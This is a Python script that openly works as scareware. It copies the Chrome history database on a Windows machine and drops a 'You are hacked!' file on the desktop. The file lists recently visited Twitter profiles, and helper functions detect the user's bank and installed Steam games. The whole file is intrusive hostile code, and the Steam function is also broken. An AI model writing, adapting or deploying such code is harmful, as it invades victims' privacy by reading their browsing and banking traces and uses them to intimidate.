import os
import sqlite3
from pathlib import Path
from shutil import copyfile
import re
from time import sleep
from random import randrange
import glob

# USER_PATH = os.environ['USERPROFILE']
USER_PATH = Path.home()
HACKER_FILENAME = "README.txt"


def delay_action():
    n_hours = randrange(1, 4)
    print(f"Sleep {n_hours} hours")
    sleep(n_hours)  # * 60 * 60)


def create_hacker_file():
    desktop_path = f"{USER_PATH}\\Desktop\\{HACKER_FILENAME}"
    hacker_file = open(desktop_path, "w")
    hacker_file.write("You are hacked! \n")
    return hacker_file


def get_chrome_history():
    urls = None
    while not urls:
        try:
            history_path = f"{USER_PATH}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\history"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)

            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            return urls
            conn.close()
        except sqlite3.OperationalError:
            print("Database is locked, retry in 3 seconds...")
            sleep(3)


def check_history_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history[:10]:
        # hacker_file.write(f"Curious! I see that you have visited the {item[0]} site")
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])

    if len(profiles_visited) > 0:
        hacker_file.write("I see that you like to see this profiles ¬¬ {}\n".format(", ".join(profiles_visited)))


def check_bank_account(hacker_file, chrome_history):
    his_bank = None
    banks = ["BBVA", "Santander", "Banorte", "Banxico", "HSBC"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break

    if his_bank:
        hacker_file.write(f"Your money is in the bank {his_bank}")


def check_steam_games(hacker_file):
    try:
        steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
        games = []
        game_paths = glob.glob(os.listdir(steam_path))
        game_paths.sort(key=os.path.getmtime, reverse=True)
        for game_path in game_paths:
            games.append(game_path.split("\\")[-1])

        hacker_file.write("Your favorite games... {}".format(", ".join(games[:3])))
    except OSError:
        print("Error to consult the games.")


def main():
    delay_action()
    hacker_file = create_hacker_file()
    # check_steam_games(hacker_file)
    chrome_history = get_chrome_history()
    check_history_and_scare_user(hacker_file, chrome_history)


if __name__ == "__main__":
    main()
